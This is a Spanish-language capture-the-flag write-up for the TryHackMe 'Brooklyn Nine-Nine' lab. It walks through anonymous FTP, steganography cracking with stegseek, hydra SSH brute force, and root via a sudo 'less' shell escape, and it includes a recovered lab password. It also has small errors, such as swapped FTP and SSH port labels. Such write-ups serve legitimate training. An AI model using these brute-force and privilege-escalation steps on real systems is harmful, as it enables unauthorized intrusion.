# THM-Brooklyn-Nine-Nine
***Anonymous FTP, Steganography & Privilege Escalation***


**Enumeracion con NMAP**
```bash
nmap -p- -sV -sC -sS --open --min-rate 5000 10.81.135.79 -n -Pn -oN ninenine.txt
```

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.220.79
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Nos da varios servicios abiertos:

```21 (ssh)```
```22 (ftp)```
```80 (htp)```

### Enumerando el protocolo FTP

Si nos damos cuenta en la enumeracion que ha realizado NMAP nos dice que dentro del servicio FTP con el user Anonymous nos podemos encontrar un archivo llamado note_to_jake.txt asique no perdemos el tiempo para entrar ahi

```bash
ftp Anonymous@10.81.135.79
```

Nos descargamos el archivo y lo abrimos desde nuestra terminal

```
From Amy, 
 Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine 
```

Ya tenemos varios users asi que nos los guardamos en un archivo users.txt

### Enumerando el protocolo HTTP

Una vez que hemos terminado con lo basico que nos mostraba pasamos a la web para ver que aloja
<br>
<br>
<img width="1910" height="958" alt="panel" src="https://github.com/user-attachments/assets/b9a35e75-b8b8-464d-bacf-2fc52fec4578" />
<br>
<br>


Vemos esta gran imagen. Tiene toda la pinta que todo va a girar en torno a realizar escanografia pero vamos a inspeccionar el codigo fuente a ver que nos pone
<br>
<br>
<img width="469" height="135" alt="codigo fuente" src="https://github.com/user-attachments/assets/6190f313-6736-4415-83b7-47cda9f20329" />
<br>
<br>

Efectivamente. Todo gira en torno a eso asi que lo primero que vamos a hacer es conocer la ruta de donde se aloja la imagen en realizar el ataque desde nuestra kali

```bash
wget http://10.81.135.79/brooklyn99.jpg
```

Ahora vamos a probar con algunas herramientas para ver que tipo de info nos da:

```bash
exiftool brooklyn99.jpg
```
<br>
<br>
<img width="558" height="418" alt="nada intereante" src="https://github.com/user-attachments/assets/b1c43950-1a0c-491f-a1e5-e9a647e6a05d" />
<br>
<br>

Nada intertesante de momento. Continuamos....

```bash
stegseek brooklyn99.jpg /usr/share/wordlists/rockyou.txt
```

<br>
<br>
<img width="720" height="144" alt="steegsheek" src="https://github.com/user-attachments/assets/4b5685b1-629c-4337-be67-e84e6412440f" />
<br>
<br>

## Que es Stegseek?
<br>
Stegseek es una herramienta de fuerza bruta ultra rápida. Su único trabajo es intentar extraer información oculta en archivos (esteganografía) probando miles de llaves por segundo. Es mucho más rápido que el comando steghide original.
<br>
<br>

```brooklyn99.jpg``` es el archivo donde sospechamos que hay algo escondido. En este caso, la imagen de Brooklyn Nine-Nine actuaba como un contenedor que guardaba un archivo secreto (`note.txt`) bajo llave.
<br>
<br>
```rockyou.txt``` Es el diccionario de contraseñas. Contiene millones de palabras que se han usado históricamente como contraseñas. En este caso el archivo note.txt estaba protegida con la pass admin

**En pocas palabras…**

Le dijimos: **"Prueba todas las contraseñas del mundo (`rockyou.txt`) contra esta imagen (`brooklyn99.jpg`) hasta que encuentres la que abre el compartimento secreto"**.

- **Lo que encontró:** La contraseña `admin`.
- **Lo que sacó:** El archivo `note.txt` con las credenciales de ```Holt.```

Ademas la herramientas stegseek nos creo un archivo llamado brooklyn99.jpg.out para que pudiesemos ver el contenido de dicho archivo note.txt que ponia lo siguiente

```
Holts Password:
fluffydog12@ninenine

Enjoy!!
```

Ya tenemos varios usuarios y una contrasenia asique lo que vamos a hacer ahora es hacer fuerza bruta en ssh con el usuario ```jake``` ya que vimos en una anterior nota que le decian que cambiase la contrasenia asique vamos a ello

```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.81.135.79
```

Efecitvamente conseguiimos su pass....

Una vez que estamos dentro vamos a intentar escalar privilegios

### Escalada de Privilegios

Vemos que ```jake``` puede corrrer un binario en ```sudo```

```
User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

```bash
/usr/bin/less /etc/hosts
```

El comando se divide en tres partes clave:

- **`sudo`**: "Ejecuta lo que viene a continuación con los máximos privilegios (como Root)".
- **`/usr/bin/less`**: "Abre el programa `less`" (un visor de texto).
- **`/etc/hosts`**: "Ábrelo para leer el archivo de hosts".

**Pero aquí está el truco:** No nos importaba para nada leer el archivo `/etc/hosts`. Podríamos haber puesto cualquier otro archivo (como `/etc/passwd` o un archivo vacío). El archivo es solo una **excusa** para que el programa `less` se abra con privilegios de Root.

---

### El Backdoor 

Lo más importante no es el comando en sí, sino lo que hiciste **dentro** de él.

Al estar dentro de `less` como Root, el programa te permite interactuar con el sistema. Al escribir **`!/bin/bash`**, le dijimos:

"Oye, less (que ahora mismo eres Root), haz una pausa y lánzame una terminal (/bin/bash)".


Como el programa "padre" (`less`) es Root, el programa "hijo" (la terminal) nace siendo **Root** automáticamente.

---

### En resumen:

Usamos `/etc/hosts` simplemente porque es un archivo que sabíamos que existía y que `less` podía abrir. Fue el **vehículo** para ejecutar el programa con permisos elevados y luego "saltar" desde dentro del programa hacia una terminal de administrador.


<br>
<br>
<img width="757" height="102" alt="root" src="https://github.com/user-attachments/assets/a6885cc6-ab48-4c58-93af-5a9c4590293a" />
<br>
<br>
YA SOMOS ROOT!
